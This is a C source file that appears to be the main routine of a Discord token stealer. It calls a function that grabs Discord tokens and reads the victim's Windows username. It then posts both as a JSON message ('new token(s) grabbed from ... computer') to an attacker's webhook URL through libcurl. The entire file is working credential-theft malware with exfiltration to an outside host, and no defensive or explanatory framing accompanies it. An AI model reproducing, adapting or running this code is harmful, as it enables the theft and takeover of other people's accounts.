#include <stdio.h>
#include <stdlib.h>
#include <regex.h>
#include <curl/curl.h>

#include "defines.h"
#include "discord.h"

int main(int argc, char const *argv[]) {
    char **tokens = grabDiscordTokens();
    char usernameBuffer[255] = "";
    DWORD usernameBufferSize = 255;
    CURL *curl;
    struct curl_slist *headers = NULL;
    char buffer[5000] = "{\"content\": \"new token(s) grabbed from ";

    if (tokens == NULL) return 0;

    GetUserNameA(usernameBuffer, &usernameBufferSize);
    strcat(buffer, usernameBuffer);
    strcat(buffer, "'s computer:\\n");


    for (size_t i = 0; tokens[i] != NULL; i++) {
        strcat(buffer, tokens[i]);
        strcat(buffer, "\\n");
    }

    strcat(buffer, "\"}");

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Dark Secret Ninja/1.0");
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buffer);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();

    return 0;
}
